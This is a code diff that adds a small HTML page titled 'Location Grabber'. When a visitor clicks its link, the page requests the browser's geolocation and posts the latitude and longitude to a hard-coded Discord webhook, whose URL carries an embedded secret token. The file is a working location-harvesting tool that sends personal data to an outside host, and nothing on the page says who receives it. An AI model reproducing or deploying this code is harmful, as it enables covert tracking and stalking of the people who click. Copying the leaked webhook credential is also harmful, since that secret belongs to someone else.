@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Grabber</title>
+</head>
+<body>
+    <a href="https://raydendagoat.vercel.app/" id="locationLink">Click me to grab location!</a>
+
+    <script>
+        document.getElementById('locationLink').addEventListener('click', function(event) {
+            event.preventDefault();
+
+            // Function to get the device's current location
+            function getCurrentLocation() {
+                return new Promise((resolve, reject) => {
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            position => {
+                                const location = {
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude
+                                };
+                                resolve(location);
+                            },
+                            error => {
+                                reject(error);
+                            }
+                        );
+                    } else {
+                        reject(new Error('Geolocation is not supported by this browser.'));
+                    }
+                });
+            }
+
+            // Function to send location via Discord webhook
+            async function sendLocationToWebhook(location) {
+                const webhookUrl = 'https://discord.com/api/webhooks/1396736187246313573/zxeVbKtQWNtoykNCAxzI66_hk1h8bevmNQagbpPqKDtOIxAytEOiIWYDbq3owkU3T_uF';
+                const payload = {
+                    content: `Location: Latitude \`${location.latitude}\`, Longitude \`${location.longitude}\``
+                };
+
+                try {
+                    const response = await fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+
+                    const data = await response.json();
+                    console.log('Success:', data);
+                } catch (error) {
+                    console.error('Error:', error);
+                }
+            }
+
+            // Main function to execute on link click
+            async function main() {
+                try {
+                    const location = await getCurrentLocation();
+                    await sendLocationToWebhook(location);
+                    alert('Location sent successfully!');
+                } catch (error) {
+                    alert('LOCATION CANT BE FOUND');
+                }
+            }
+
+            main();
+        });
+    </script>
+</body>
+</html>
